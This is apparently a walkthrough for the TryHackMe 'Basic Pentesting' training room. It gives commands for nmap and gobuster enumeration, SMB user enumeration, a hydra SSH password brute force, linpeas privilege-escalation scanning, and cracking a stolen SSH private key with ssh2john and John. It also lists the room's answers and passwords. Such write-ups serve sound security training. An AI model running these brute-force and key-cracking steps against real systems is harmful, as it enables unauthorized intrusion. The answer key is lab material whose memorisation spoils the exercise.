Room: https://tryhackme.com/r/room/basicpentestingjt

Title: Basic Pentesting

Target IP: 10.10.124.85

1. Find the services exposed by the machine

   - Let's perform a basic nmap scan to see what services are open and exposed!
   - ```nmap -sV -sC [Target IP Address]```
     
  ![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/1694ee34-5b12-436e-991c-5e15d48776e1)

  - Interesting results ðŸ¤”! We see there are multiple ports open, including a http web server on port 80 and we see this machine may have some SMB vulnerabilities...

2. What is the name of the hidden directory on the web server?

  - Use a web enuermation tool such as gobuster to find hidden directories...
  - ```gobuster dir -u http://[Target IP Address] -w /usr/share/wordlists/dirb/common.txt```

  -NOTE: Ensure you have a wordlist downloaded before using gobuster. You can find these wordlists using google.

  ![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/8a52fb90-2bc8-45ea-9d10-f8177f1654c1)

  - There are two directories that spark our interest (ignore the ones with Status: 403); /development and /index.html

  - Navigating to /development...

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/fec00c06-5520-4374-a92d-5c7bea4eae34)

  - Let's look at these two text files, dev.txt and j.txt...

  - Read the following and keep in mind some important information mentioned such as version 2.5.12, SMB being configured, Apache set up, J has a weak password, etc...

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/25517365-d20c-43d9-be65-691a1fb1c82c)

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/643c4e49-1d87-40eb-92da-453e791c5402)


  - Navigating to /index.html...

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/5424be5c-d69a-4c53-99c2-e4248c9dcec2)

  - Answer: ***development***

3. User brute-forcing to find the username & password

   - Remember earlier how we saw SMB was configured? Let's see if we can do enumeration on that port with the enum4linux tool...
   - ```enum4linux -a [Target IP Address]```
   - ```-a``` tells the machine to perform a simple enumeration
   - Looks like we find the usernames kay and jan!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/0d37e0da-9097-47d0-b22f-a0ecda57ac56)


  - A great tool to use for brute forcing usernames and passwords is hydra
  - ```hydra -L <userlist> -P <wordlist> <target>```
  - We need to find the ssh credentials: ```hydra -L <userlist> -P <Target IP Address> ssh```
  - Using the user jan, ```hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.124.85 ssh```
  - NOTE: the ```-l``` is lowercase because we use jan rather than a directory, whereas ```-P``` is capital b/c we have a directory to a wordlist

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/9f257996-622b-4cd6-aa1a-bfe262e9c7b6)


4. What is the username?

  - Answer: ***jan***

5. What is the password?

   - Answer: ***armando***

6. What service do you use to access the server?

   - Answer: ***SSH***
  
7. Enumerate the machine to find any vectors for privilege escalation

   - Using ssh we are in the machine! Let's do some enumeration
   - ```ssh jan@[Target IP Address]```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/7581f8ea-9972-4f62-8a6e-ff0ccefca448)

- Download the ```linpeas.sh``` script found at https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- Use ```scp linpeas.sh jan@[Target IP]:/dev/shm``` to copy the file from our machine to Jan's
- NOTE: we must copy to the /dev/shm directory due to priveleges, other directories did not work

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/70464f5a-edc2-4e72-9d64-84e8fbac50c6)

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/7c099a38-1358-454c-a044-4ea63c9313e8)

- Mark the file as executable or you will get a "permission denied"
  ```chmod +x linpeas.sh```
- Now run the linpeas script using ```./linpeas.sh```

- Look through and mark down anything interesting. Here I have found a private SSH key for the kay user...

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/3b84a188-c016-4474-8962-49e4dddce895)


8. What is the name of the other user you found?

  - Answer: ***kay***

9. If you have found another user, what can you do with this information?

  - Remember that SSH key we saw earlier? Let's use that to login to kay's account
  - Navigate to the ssh key in the ```/home/kay/.ssh``` directory

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/8ac91a32-82b2-4fd9-85d6-0d637313d81a)

  - Now we have the hash for kay! Let's move back to our machine and use John the Ripper to crack the hash...
  - Create a new text file ```nano kayhash.txt``` and copy over the id_rsa contents to this file

  ![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/45670bd5-800c-4126-848f-220be55e01cb)

  - Convert the hash with ssh2john and save it as a new text file ```/usr/share/john/ssh2john.py kayhash.txt > forjohn.txt```
  - NOTE: your directory location of ssh2john may vary, use ```find /usr/share/john/ -name "ssh2john.py"``` to find it

  - Now run john and find the password...

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/f958ed71-3d80-4939-a0e6-38898bfe9a7f)

  - We get the password ***beeswax***
  - Before logging in, do ```chmod 600 kayhash.txt``` so only the owner, us, can read this file. This is how rsa keys work...
  - Login with ```ssh -i kayhash.txt kay@[Target IP]```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/2ac7e05d-75d6-4529-8699-5991db0376b1)

  - Finally, access the ```pass.bak``` file for the last flag!!!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/a85b6ad5-897f-47d3-861d-b6139c6a9a2b)

10. What is the final password you obtain?

  - Answer: ***heresareallystrongpasswordthatfollowsthepasswordpolicy$$***
